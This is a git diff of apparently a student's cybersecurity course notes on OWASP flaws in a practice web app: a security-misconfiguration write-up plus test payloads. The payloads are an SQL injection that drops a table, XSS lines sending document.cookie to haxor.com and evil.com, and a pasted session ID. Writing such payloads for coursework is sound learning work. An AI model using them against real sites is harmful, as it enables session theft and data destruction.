@@ -20,6 +20,23 @@ Starter code for the project is provided on Github at https://github.com/cyberse
 
 LINK: <link to repo>
 
+
+##FLAW 1: A6:2017-Security Misconfiguration
+#OWASP description of the security flaw:
+Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure
+default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured
+HTTP headers, and verbose error messages containing sensitive information. Not only must all
+operating systems, frameworks, libraries, and applications be securely configured, but they must
+be patched and upgraded in a timely fashion.
+
+#How the security flaw behaves in the app
+H2 data base URL not secured and using default password
+
+#How to fix the security flaw in the app
+Change default password to H2
+
+
+
 ##FLAW 1: A6:2017-Security Misconfiguration
 #OWASP description of the security flaw:
 Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure
@@ -88,19 +105,13 @@ harjoituksesta joku missä oli tää?
 INSERT INTO signup (address, name) VALUES ('testijuttu', 'moikka')
 
 INSERT INTO signup (address, name) VALUES ('testijuttu', '
-moikka') ; DROP TABLE signup; --
+Bye bye courses!') ; DROP TABLE course; --
 ')
 
 
+# ALLA OLEVA TOIMII
+<script>document.write("<img src=\"http://www.haxor.com/cookisteal/" + document.cookie +"\"/>")  </script>
 
-<script>
-fetch("http://localhost:8080/orders", {
-method: 'POST',
-headers: new Headers({
-'Content-Type': 'application/x-www-form-urlencoded'
-}),
-body: "name=Hakkeri&address=Bittikatu 2"})
-</script>
-
-
+<script>fetch("http://www.haxor.com/cookisteal/" + document.cookie) </script>
 document.cookie="JSESSIONID=12EE43AF515F83867B20D94907108063"
+<img src='https://yourserver.evil.com/collect.gif?cookie=' + document.cookie/>
